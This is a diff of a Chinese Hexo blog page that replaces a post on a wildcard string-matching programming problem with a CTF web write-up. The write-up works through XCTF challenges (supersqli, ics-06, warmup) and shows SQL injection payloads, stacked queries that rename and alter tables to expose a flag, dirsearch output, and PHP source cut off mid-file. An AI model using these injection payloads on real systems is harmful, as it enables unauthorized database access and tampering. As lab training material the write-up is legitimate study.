@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://v25bh145.github.io">
-  <title>Question-P2536 | V25bh145的小家儿~</title>
+  <title>CTF笔记-WEB攻防-02 | V25bh145的小家儿~</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="题目描述科学家们在Samuel星球上的探险仍在继续。非常幸运的，在Samuel星球的南极附近，探险机器人发现了一个巨大的冰湖！机器人在这个冰湖中搜集到了许多RNA片段运回了实验基地。 科学家们经过几个昼夜的研究，发现这些RNA片段中有许多是未知的病毒！ 每个RNA片段都是由A、C、T、G组成的序列。科学家们也总结出了Samuel星球上的“病毒模版片段”。一个模版片段是由A、C、T、G的序列加上通配">
-<meta name="keywords" content="Question,暴力">
+  <meta name="description" content="supersqli sql注入题目  手写先试试万能的单引号，果然报错了： 1error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;apos;&amp;apos;">
+<meta name="keywords" content="ctf-web,CTF笔记-WEB攻防">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Question-P2536">
-<meta property="og:url" content="https:&#x2F;&#x2F;v25bh145.github.io&#x2F;2020&#x2F;03&#x2F;02&#x2F;questions&#x2F;Question-P2536&#x2F;index.html">
+<meta property="og:title" content="CTF笔记-WEB攻防-02">
+<meta property="og:url" content="https:&#x2F;&#x2F;v25bh145.github.io&#x2F;2020&#x2F;10&#x2F;01&#x2F;ctf&#x2F;ctf%E7%AC%94%E8%AE%B0-03&#x2F;index.html">
 <meta property="og:site_name" content="V25bh145的小家儿~">
-<meta property="og:description" content="题目描述科学家们在Samuel星球上的探险仍在继续。非常幸运的，在Samuel星球的南极附近，探险机器人发现了一个巨大的冰湖！机器人在这个冰湖中搜集到了许多RNA片段运回了实验基地。 科学家们经过几个昼夜的研究，发现这些RNA片段中有许多是未知的病毒！ 每个RNA片段都是由A、C、T、G组成的序列。科学家们也总结出了Samuel星球上的“病毒模版片段”。一个模版片段是由A、C、T、G的序列加上通配">
+<meta property="og:description" content="supersqli sql注入题目  手写先试试万能的单引号，果然报错了： 1error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;apos;&amp;apos;">
 <meta property="og:locale" content="zh-cn">
-<meta property="og:updated_time" content="2020-09-29T11:51:46.101Z">
+<meta property="og:updated_time" content="2020-10-11T14:13:07.586Z">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="V25bh145的小家儿~" type="application/atom+xml">
@@ -171,14 +171,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-questions/Question-P2536" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-ctf/ctf笔记-03" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      Question-P2536
+      CTF笔记-WEB攻防-02
     </h1>
   
 
@@ -190,8 +190,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2020/03/02/questions/Question-P2536/" class="archive-article-date">
-        <time datetime="2020-03-02T08:52:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-02</time>
+<a href="/2020/10/01/ctf/ctf%E7%AC%94%E8%AE%B0-03/" class="archive-article-date">
+        <time datetime="2020-10-01T13:25:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-01</time>
 </a>
 
   
@@ -204,7 +204,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">2.1k字</span>
+      <span class="post-count">1.6k字</span>
     </span>
   </span>
 
@@ -213,7 +213,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">8分</span>
+      <span class="post-count">7分</span>
     </span>
   </span>
 </div>
@@ -224,166 +224,84 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>科学家们在Samuel星球上的探险仍在继续。非常幸运的，在Samuel星球的南极附近，探险机器人发现了一个巨大的冰湖！机器人在这个冰湖中搜集到了许多RNA片段运回了实验基地。</p>
-<p>科学家们经过几个昼夜的研究，发现这些RNA片段中有许多是未知的病毒！</p>
-<p>每个RNA片段都是由A、C、T、G组成的序列。科学家们也总结出了Samuel星球上的“病毒模版片段”。一个模版片段是由A、C、T、G的序列加上通配符 * 和 ? 来表示。其中 * 的意思是可以匹配上0个或任意多个字符，而 ? 的意思是匹配上任意一个字母。</p>
-<p>如果一个RNA片段能够和“病毒模版片段”相匹配，那么这个RNA片段就是未知的病毒。</p>
-<p>例如，假设“病毒模版片段”为A*G?C。RNA片段：AGTC，AGTGTC都是未知的病毒，而RNA片段AGTGC则不是病毒。</p>
-<p>由于，机器人搜集的这些RNA片段中除去病毒的其他部分都具有非常高的研究价值。所以科学家们希望能够分辨出其中哪些RNA片段不是病毒，并将不是病毒的RNA片段运回宇宙空间站继续进行研究。</p>
-<p>科学家将这项任务交给了小联。现在请你为小联编写程序统计哪些RNA片段不是病毒。</p>
-<a id="more"></a>
+    <h1 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5417&page=1" target="_blank" rel="noopener">supersqli</a></h1><blockquote>
+<p>sql注入题目</p>
+</blockquote>
+<h2 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h2><p>先试试万能的单引号，果然报错了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos;1&apos;&apos;&apos; at line 1</span><br></pre></td></tr></table></figure>
 
-<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一行有一个字符串，由A、C、T、G、*、? 组成。表示“病毒模版片段”。“病毒模版片段”的长度不超过1000。第二行有一个整数N（0 &lt; N &lt; 500），表示机器人搜集到的RNA片段的数目。随后的N行，每一行有一个字符串，由A、C、T、G组成，表示一个RNA片段。每个RNA片段的长度不超过500。注意：“病毒模版片段”和RNA片段的长度都至少为1。</p>
-<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>只有一行输出，为整数M，即不是病毒的RNA片段的数目。</p>
-<h2 id="输入输出样例"><a href="#输入输出样例" class="headerlink" title="输入输出样例"></a>输入输出样例</h2><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入 #1"></a>输入 #1</h3><pre><code>A*G?C
-    3
-AGTC
-AGTGTC
-AGTGC</code></pre><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出 #1"></a>输出 #1</h3><pre><code>1</code></pre><h2 id="说明-提示"><a href="#说明-提示" class="headerlink" title="说明/提示"></a>说明/提示</h2><p>输入中的RNA片段AGTGC不是病毒。</p>
-<h2 id="听歌儿"><a href="#听歌儿" class="headerlink" title="听歌儿"></a>听歌儿</h2><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=461885&auto=0&height=66"></iframe>
+<p>注意一下，<strong>第一个’和最后一个’是起标识位置作用的</strong>,就是一个单引号,所以原语句是’1’(<code>单引号闭合</code>)</p>
+<h3 id="尝试-联合注入"><a href="#尝试-联合注入" class="headerlink" title="尝试 联合注入"></a>尝试 联合注入</h3><p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;+union+select+database()+--+</span><br></pre></td></tr></table></figure>
 
-<p>大爱凉风~</p>
-<h1 id="解"><a href="#解" class="headerlink" title="解"></a>解</h1><p><del>看似紫题，实则水题</del></p>
-<p><del>其实只是因为咱发现了独特的解法</del></p>
-<p>一看数据范围，哇，500 <del>(wushiling wwwww)</del> 这次应该打暴力了</p>
-<p>*用于分割字符串，那咱干脆就把字符串分开算了：</p>
-<blockquote>
-<p>建立字符串的一维数组和一个处理数据的临时字符栈，扫描输入的字符串，见到字符就放到栈里，见到*就全部出栈，放到字符串数组下标len的字符串里，然后len++</p>
-</blockquote>
-<p>当然咱还得处理俩特殊情况：</p>
-<ol>
-<li><p>*开头</p>
-</li>
-<li><p>*连续出现，中间没有字符分割</p>
-</li>
-</ol>
-<p>这俩情况咱if特判一下就好啦</p>
-<p>然后就该读入测试数据了：</p>
-<blockquote>
-<p>咱就让每个测试字符串依次通过目标字符串们(目标字符串由*断开)的审核，如果通过了就消掉前面通过的部分，如果没通过就出来，不匹配</p>
-</blockquote>
-<blockquote>
-<p>同时这种测试可以<code>贪心</code>解决，在同一个测试字符串中对于同一个目标字符串，最先匹配到(这里的先指的是字符顺序优先，咱匹配肯定是按照字符顺序扫描着来的嘛)的必然是最优解(而不是唯一最优解，这里说明)</p>
-</blockquote>
-<p>然后是匹配(每一个目标字符串匹配一次)的问题：</p>
-<p>咱可以使用并行来匹配，就像VScode匹配选中的字符一样(没错就是这里给了我灵感)</p>
-<ol>
-<li><p>先过第一个目标字符串的字符，扫描测试字符串里所有的该字符，按优先度(以顺序优先，<strong>也同时完成了暗中的贪心必备排序</strong>)存上位置</p>
-</li>
-<li><p>目标字符串里的字符一个一个过，每过一个字符就遍历一遍还在字符串里的字符，判断那个字符的下一个字符是不是这个目标字符串里的字符，是则位置+1，否则踢出数组</p>
-</li>
-<li><p>最后导致结束的两种情况：</p>
-<ul>
-<li><p>数组空了</p>
-</li>
-<li><p>目标字符串进行匹配完了</p>
-<p>第一种情况则匹配失败，第二种情况则匹配成功，取最前面完成匹配的数组的位置(也就是位置存值最小的地方)，断掉之前的所有元素，继续换下一个目标字符串进行</p>
-</li>
-</ul>
-</li>
-</ol>
-<p>很完美的解法咯，最后我想到数组可以换成链表就可以解决删除数组元素复杂度太大的问题了，这里就变成了线性复杂度而非平方(ps：可惜写链表老是RE错误，暴力数组却过了所以这里的优化也许是没有必要的哈哈哈哈哈哈)</p>
-<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><pre><code>//Madoka daisuki!!!
-#include&lt;bits/stdc++.h&gt;
-using namespace std;
-int n, dictLen = 0, dictLenSingle[1000], ans = 0;
-char sAll[1050];
-char stmp[505];
-char dict[1050][1050];
-//根据*来划分目标字符串
-void Build()
-{
-    int len = strlen(sAll), tmpl = 0;
-    for(int i = 0; i &lt; len; i++)
-    {
-        //这俩if就是特判啦
-        if(i == 0 &amp;&amp; sAll[i] == &apos;*&apos;) continue;
-        if(sAll[i] == &apos;*&apos; &amp;&amp; sAll[i - 1] == &apos;*&apos;) continue;
+<p>返回了一段这样的包含正则匹配的php代码，说明不可行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
 
-        if(sAll[i] != &apos;*&apos;) dict[dictLen][tmpl++] = sAll[i];
-        else
-        {
-            dictLenSingle[dictLen++] = tmpl;
-            tmpl = 0;
-        }
-    }    
-    if(tmpl != 0)
-    {
-        dictLenSingle[dictLen++] = tmpl;
-        tmpl = 0;
-    }
-}
-//对应一个测试字符串和目标字符串数组(目标字符串们)
-int Exam(char tmps[], int k, int st, int ed)
-{
-    //你瞧这暴力的开空间
-    int* pos = new int[ed - st + 1];
-    int posLen = 0, res = ed;
-    for(int i = 0; i &lt; ed - st + 1; i++) pos[i] = 0;
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><a id="more"></a>
 
-    for(int i = 0; i &lt; dictLenSingle[k]; i++)
-    {
-        if(i == 0)
-        {
-            for(int j = st; j &lt; ed - dictLenSingle[k] + 1; j++)
-                if(tmps[j] == dict[k][0] || dict[k][0] == &apos;?&apos;)
-                    pos[posLen++] = j;
-            continue;
-        }
-        for(int j = 0; j &lt; posLen; j++)
-            if(pos[j] != -1)
-            {
-                if(tmps[pos[j] + 1] == dict[k][i] || dict[k][i] == &apos;?&apos;) pos[j]++;
-                //你瞧这暴力的置空
-                else pos[j] = -1;
-            }
-    }
-    for(int i = 0; i &lt; posLen; i++)
-        if(pos[i] != -1) //你瞧这暴力的判定
-            res = res &lt; pos[i] ? res : pos[i];
-    return res;
-}
-bool Judge(char tmps[])
-{
-    int st = 0, ed = strlen(tmps);
-    for(int i = 0; i &lt; dictLen; i++)
-    {
-        st = Exam(tmps, i, st, ed);
-        if(st == ed) return false;
-    }
-    return true;
-}
-int main()
-{
-    scanf(&quot;%s&quot;, sAll);
-    Build();
-    scanf(&quot;%d&quot;, &amp;n);
-    for(int i = 1; i &lt;= n; i++)
-    {
-        scanf(&quot;%s&quot;, stmp);
-        if(!Judge(stmp)) ans++;
-    }
-    printf(&quot;%d&quot;, ans);
-}</code></pre><h1 id="时间复杂度分析"><a href="#时间复杂度分析" class="headerlink" title="时间复杂度分析"></a>时间复杂度分析</h1><p>我用的是数组嘛，但是我把那里的时间复杂度也缩短到了线性,因为我在删除的时候根本没有移位 <del>(就是常数远远大于链表哈哈哈)</del></p>
-<p>前面构建目标数组们： $$ O( N_{目标字符串们的总长} ) (N &lt; 1000) $$</p>
+<p>这里先引入一个堆叠注入的方法：用分号闭合原语句，在后面输入任意语句使mysql批量执行。</p>
+<p>关于堆叠注入(发现写的很好，搬过来)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</span><br></pre></td></tr></table></figure>
+
+<p>在联合注入碰到钉子之后，试图尝试堆叠注入，期望服务器可以返回多行sql语句运行的结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;; show databases;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入ctftraining看看，查查里面的表和字段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos;; show tables from ctftraining;</span><br><span class="line"></span><br><span class="line">1&apos;; show columns from FLAG_TABLE from ctftraining;</span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p>后面单个个测试字符串的测试时间： </p>
+<p>这里的字段其实是获取不到的，我们无法使用可以绕过正则匹配的命令来获取到字段</p>
 </blockquote>
-<p>$$ O( N_{分隔符的个数} * ( N_{目前测试字符串长度} + N_{这个目标字符串长度} * N_{第一个目标字符匹配到相等的测试字符的数量} ) ) $$</p>
+<p>再进所在的数据库看看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos;; show tables;</span><br><span class="line">1&apos;; show columns from words;</span><br><span class="line">1&apos;; show columns from `1919810931114514`;</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，<code>遇到以数字为表名的表，查询时需要加反引号</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现碰钉子了：<code>如何不用select查询数据呢</code>？</p>
+<p>=&gt;可以使用<code>rename</code> (<code>alter</code>)命令来输出所想要的表中的字段,也就是偷梁换柱</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;</span><br></pre></td></tr></table></figure>
+
+<p>现在直接查询id=’1’,发现报错：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error 1054 : Unknown column &apos;id&apos; in &apos;where clause&apos;</span><br></pre></td></tr></table></figure>
+
+<p>所以我们所伪造的words表还需要一个名为id的字段，我们可以改变字段为id，也可以添加新字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE exampleTable change exampleFiledFrom exampleFiledTo exampleType;</span><br><span class="line">ALTER TABLE exampleTable  ADD exampleField exampleType; #CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT &apos;&apos; COMMENT &apos;&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>1’; alter table words add id VARCHAR(100);</p>
+<p>突然发现环境已经被我们整坏了，因为对id的查询已经失效了，所以只能重启环境来完成实验了()</p>
+<p>正确的方法应该是，rename方法与alter方法在同一批次执行，才能保证where id = ‘1’有效。</p>
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload 1:"></a>payload 1:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;alter table words add id VARCHAR(100) default 1;</span><br><span class="line"></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;alter table words add id VARCHAR(100) default 1;</span><br><span class="line"></span><br><span class="line">1&apos;; or 1=1;</span><br></pre></td></tr></table></figure>
+
+<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload 2:"></a>payload 2:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;alter table words change flag id VARCHAR(100);</span><br><span class="line"></span><br><span class="line">1&apos;; or 1=1;</span><br></pre></td></tr></table></figure>
+
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>如果需要使用脚本，脚本的查询很耗时且只使用脚本几乎不可行。</p>
+<p>在使用<code>--dbs</code>查询时，只能获取到一个可用supersqli数据库，并且在使用<code>--tabkes</code>查询时，其使用的是暴力查表查询，common常用表一个表也识别不出来<del>，更不用说那一长串发臭的数字，根本匹配不到</del>。</p>
+<h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4920&page=1" target="_blank" rel="noopener">ics-06</a></h1><p>进入之后是一个dashbord页面，首先dirsearch，发现了index.php，并且总是会重定向到id=1，很奇怪</p>
 <blockquote>
-<p>俩一加，得到：</p>
+<p>这道题的解法更离谱，需要使用burp暴力枚举id，会发现id=2333时数据量不一样，出现flag……</p>
 </blockquote>
-<p>$$ O( N_{分隔符的个数} * ( N_{目前测试字符串长度} + N_{这个目标字符串长度} * N_{第一个目标字符匹配到相等的测试字符的数量} ) )  $$<br>$$ = O( N_{分隔符的个数} * N_{目前测试字符串长度} + N_{分隔符的个数} * N_{这个目标字符串长度} * N_{第一个目标字符匹配到相等的测试字符的数量} )  $$<br>$$ = O( N_{分隔符的个数} * N_{目前测试字符串长度} + N_{目标字符串们的总长} * N_{第一个目标字符匹配到相等的测试字符的数量} )  $$</p>
-<blockquote>
-<p>按照随机的原则:</p>
-</blockquote>
-<p>$$ N_{第一个目标字符匹配到相等的测试字符的数量} \approx N_{一个测试字符串长度} / 4 $$</p>
-<blockquote>
-<p>最后乘上个测试字符串的个数： </p>
-</blockquote>
-<p>$$ O( N_{目标字符串们的总长} * N_{一个测试字符串长度} * N_{测试字符串的个数} ) $$</p>
-<p>差不多就是 1000 * 500 * 500，2.5E8是够的，实际的数字比这个小好多(有除以4呢)</p>
-<p>如果我们用链表，那么常数就更小更小咯，不过这已经足够了 <del>(为什么我动态链表RE了！QAQ)</del></p>
+<h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5442&page=1" target="_blank" rel="noopener">warmup</a></h1><p>进入是个大滑稽(滑稽)</p>
+<p>使用dirsearch来一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[20:10:25] 403 -  306B  - /.htaccess.bak1</span><br><span class="line">[20:10:25] 403 -  306B  - /.htaccess.save</span><br><span class="line">[20:10:25] 403 -  306B  - /.htaccess.orig</span><br><span class="line">[20:10:25] 403 -  308B  - /.htaccess.sample</span><br><span class="line">[20:10:25] 403 -  304B  - /.htaccessBAK</span><br><span class="line">[20:10:25] 403 -  304B  - /.htaccessOLD</span><br><span class="line">[20:10:25] 403 -  305B  - /.htaccessOLD2</span><br><span class="line">[20:10:25] 403 -  303B  - /.httr-oauth</span><br><span class="line">[20:10:34] 200 -  354B  - /index.php</span><br><span class="line">[20:10:34] 200 -  354B  - /index.php/login/</span><br><span class="line">[20:10:38] 403 -  305B  - /server-status</span><br><span class="line">[20:10:38] 403 -  306B  - /server-status/</span><br><span class="line">[20:10:38] 200 -    8KB - /source.php</span><br></pre></td></tr></table></figure>
+
+<p>进入source.php，看到了php源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span 